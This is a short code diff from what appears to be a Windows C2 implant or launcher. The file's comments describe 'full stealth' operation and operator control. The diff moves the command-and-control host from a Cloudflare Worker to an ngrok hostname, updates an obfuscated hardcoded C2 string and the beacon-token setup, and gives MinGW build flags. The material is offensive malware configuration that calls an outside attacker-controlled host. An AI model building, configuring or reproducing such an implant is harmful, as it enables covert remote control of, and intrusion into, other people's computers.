@@ -13,8 +13,8 @@
 //   - Tray icon for operator control (optional, can be stripped for full stealth)
 //
 // CONFIGURE BEFORE BUILDING:
-//   LAUNCHER_C2_HOST     — Cloudflare Worker hostname (no https://, no slash)
-//   LAUNCHER_BEACON_TOKEN — must match BEACON_TOKEN set via wrangler secret put
+//   LAUNCHER_C2_HOST     — ngrok hostname (no https://, no slash)
+//   LAUNCHER_BEACON_TOKEN — must match --beacon-token passed to c2_server.py
 //
 // Build (MinGW-w64):
 //   x86_64-w64-mingw32-g++ -std=c++17 -DUNICODE -D_UNICODE -mwindows
@@ -40,7 +40,7 @@
 static std::wstring GetLauncherC2Host() {
     static wchar_t buf[64] = {};
     if (!buf[0]) {
-        auto s = XSW(L"ghost-c2.sujallamichhane.workers.dev");
+        auto s = XSW(L"mute-attempt-fossil.ngrok-free.dev");
         wcsncpy_s(buf, s.str(), _TRUNCATE);
     }
     return buf;
